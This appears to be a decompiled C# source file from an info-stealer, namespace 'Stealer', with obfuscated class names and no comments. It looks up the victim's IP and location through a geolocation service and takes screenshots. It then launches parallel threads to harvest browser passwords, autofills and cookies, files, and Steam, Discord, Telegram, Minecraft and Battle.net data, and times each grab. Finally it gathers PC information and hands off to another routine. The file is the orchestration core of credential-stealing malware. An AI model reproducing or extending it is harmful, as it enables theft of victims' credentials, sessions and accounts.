using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Xml;

namespace Stealer;

public class cDFkBrvXKxXwYB
{
	public static string text = "";

	public static string elapsedTime = "";

	public static string elapsedCode = "";

	public static string elapsedCountry = "";

	public static string elapsedCity = "";

	public static string elapsedFile = "";

	public static string elapsedSteam = "";

	public static string elapsedPasswords = "";

	public static string elapsedAutofills = "";

	public static string elapsedCookies = "";

	public static string elapsedDiscord = "";

	public static string elapsedTG = "";

	public static string elapsedMinecraft = "";

	public static string elapsedBattle = "";

	public static List<Thread> threads = new List<Thread>();

	public static string ip()
	{
		try
		{
			Stopwatch stopwatch = Stopwatch.StartNew();
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(text);
			string innerText = xmlDocument.GetElementsByTagName("IP")[0]!.InnerText;
			stopwatch.Stop();
			TimeSpan elapsed = stopwatch.Elapsed;
			elapsedCode = $"{elapsed.Hours:00}:{elapsed.Minutes:00}:{elapsed.Seconds:00}.{elapsed.Milliseconds:000}";
			return innerText;
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
			return "Failed";
		}
	}

	public static void download()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			using WebClient webClient = new WebClient();
			webClient.Encoding = Encoding.UTF8;
			webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36");
			text = webClient.DownloadString("https://freegeoip.app/xml/");
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
			text = "Error";
		}
	}

	public static string Code()
	{
		try
		{
			Stopwatch stopwatch = Stopwatch.StartNew();
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(text);
			string innerText = xmlDocument.GetElementsByTagName("CountryCode")[0]!.InnerText;
			stopwatch.Stop();
			TimeSpan elapsed = stopwatch.Elapsed;
			elapsedCode = $"{elapsed.Hours:00}:{elapsed.Minutes:00}:{elapsed.Seconds:00}.{elapsed.Milliseconds:000}";
			return innerText;
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
			return "Failed";
		}
	}

	public static string Country()
	{
		try
		{
			Stopwatch stopwatch = Stopwatch.StartNew();
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(text);
			string innerText = xmlDocument.GetElementsByTagName("CountryName")[0]!.InnerText;
			stopwatch.Stop();
			TimeSpan elapsed = stopwatch.Elapsed;
			elapsedCountry = $"{elapsed.Hours:00}:{elapsed.Minutes:00}:{elapsed.Seconds:00}.{elapsed.Milliseconds:000}";
			return innerText;
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
			return "Failed";
		}
	}

	public static string City()
	{
		try
		{
			Stopwatch stopwatch = Stopwatch.StartNew();
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(text);
			string innerText = xmlDocument.GetElementsByTagName("City")[0]!.InnerText;
			stopwatch.Stop();
			TimeSpan elapsed = stopwatch.Elapsed;
			elapsedCity = $"{elapsed.Hours:00}:{elapsed.Minutes:00}:{elapsed.Seconds:00}.{elapsed.Milliseconds:000}";
			return innerText;
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
			return "Failed";
		}
	}

	public static void Start()
	{
		Stopwatch stopwatch = Stopwatch.StartNew();
		Directory.CreateDirectory(Help.path_stealer + "Browsers\\");
		Directory.CreateDirectory(Help.path_stealer + "Browsers\\Cookies\\");
		Screenshot.get("Screenshot");
		Thread t1 = new Thread((ThreadStart)delegate
		{
			tBBjEnntmoNlKq.start();
		});
		Thread t2 = new Thread((ThreadStart)delegate
		{
			SteamGrab.get();
		});
		Thread t3 = new Thread((ThreadStart)delegate
		{
			HPCDmXNsRephme.start();
		});
		Thread t4 = new Thread((ThreadStart)delegate
		{
			QLevflljZWQAqd.get();
		});
		Thread t5 = new Thread((ThreadStart)delegate
		{
			FileGrabber.get();
		});
		Thread t6 = new Thread((ThreadStart)delegate
		{
			DiscordGrab.get();
		});
		Thread t7 = new Thread((ThreadStart)delegate
		{
			TGrab.get();
		});
		Thread t8 = new Thread((ThreadStart)delegate
		{
			MinecraftGrab.get();
		});
		Thread t9 = new Thread((ThreadStart)delegate
		{
			BattleNet.get();
		});
		try
		{
			new Thread((ThreadStart)delegate
			{
				t1.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				t2.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				t3.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				t4.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				t5.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				t6.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				t7.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				t8.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				t9.Start();
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch10 = Stopwatch.StartNew();
				t5.Join();
				stopwatch10.Stop();
				TimeSpan elapsed10 = stopwatch10.Elapsed;
				elapsedFile = $"{elapsed10.Hours:00}:{elapsed10.Minutes:00}:{elapsed10.Seconds:00}.{elapsed10.Milliseconds:000}";
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch9 = Stopwatch.StartNew();
				t2.Join();
				stopwatch9.Stop();
				TimeSpan elapsed9 = stopwatch9.Elapsed;
				elapsedSteam = $"{elapsed9.Hours:00}:{elapsed9.Minutes:00}:{elapsed9.Seconds:00}.{elapsed9.Milliseconds:000}";
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch8 = Stopwatch.StartNew();
				t3.Join();
				stopwatch8.Stop();
				TimeSpan elapsed8 = stopwatch8.Elapsed;
				elapsedPasswords = $"{elapsed8.Hours:00}:{elapsed8.Minutes:00}:{elapsed8.Seconds:00}.{elapsed8.Milliseconds:000}";
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch7 = Stopwatch.StartNew();
				t4.Join();
				stopwatch7.Stop();
				TimeSpan elapsed7 = stopwatch7.Elapsed;
				elapsedAutofills = $"{elapsed7.Hours:00}:{elapsed7.Minutes:00}:{elapsed7.Seconds:00}.{elapsed7.Milliseconds:000}";
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch6 = Stopwatch.StartNew();
				t1.Join();
				stopwatch6.Stop();
				TimeSpan elapsed6 = stopwatch6.Elapsed;
				elapsedCookies = $"{elapsed6.Hours:00}:{elapsed6.Minutes:00}:{elapsed6.Seconds:00}.{elapsed6.Milliseconds:000}";
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch5 = Stopwatch.StartNew();
				t6.Join();
				stopwatch5.Stop();
				TimeSpan elapsed5 = stopwatch5.Elapsed;
				elapsedDiscord = $"{elapsed5.Hours:00}:{elapsed5.Minutes:00}:{elapsed5.Seconds:00}.{elapsed5.Milliseconds:000}";
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch4 = Stopwatch.StartNew();
				t7.Join();
				stopwatch4.Stop();
				TimeSpan elapsed4 = stopwatch4.Elapsed;
				elapsedTG = $"{elapsed4.Hours:00}:{elapsed4.Minutes:00}:{elapsed4.Seconds:00}.{elapsed4.Milliseconds:000}";
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch3 = Stopwatch.StartNew();
				t8.Join();
				stopwatch3.Stop();
				TimeSpan elapsed3 = stopwatch3.Elapsed;
				elapsedMinecraft = $"{elapsed3.Hours:00}:{elapsed3.Minutes:00}:{elapsed3.Seconds:00}.{elapsed3.Milliseconds:000}";
			}).Start();
			new Thread((ThreadStart)delegate
			{
				Stopwatch stopwatch2 = Stopwatch.StartNew();
				t9.Join();
				stopwatch2.Stop();
				TimeSpan elapsed2 = stopwatch2.Elapsed;
				elapsedBattle = $"{elapsed2.Hours:00}:{elapsed2.Minutes:00}:{elapsed2.Seconds:00}.{elapsed2.Milliseconds:000}";
			}).Start();
			t1.Join();
			t2.Join();
			t3.Join();
			t4.Join();
			t5.Join();
			t6.Join();
			t7.Join();
			t8.Join();
			t9.Join();
			foreach (Thread thread in threads)
			{
				thread.Join();
			}
			new Thread((ThreadStart)delegate
			{
				Screenshot.get("Screenshot2");
			}).Start();
			stopwatch.Stop();
			TimeSpan elapsed = stopwatch.Elapsed;
			elapsedTime = $"{elapsed.Hours:00}:{elapsed.Minutes:00}:{elapsed.Seconds:00}.{elapsed.Milliseconds:000}";
			pcinfo.get();
			XlmdPNCfRyqKEs.Start();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex);
			Handler.error(ex.ToString());
		}
	}
}
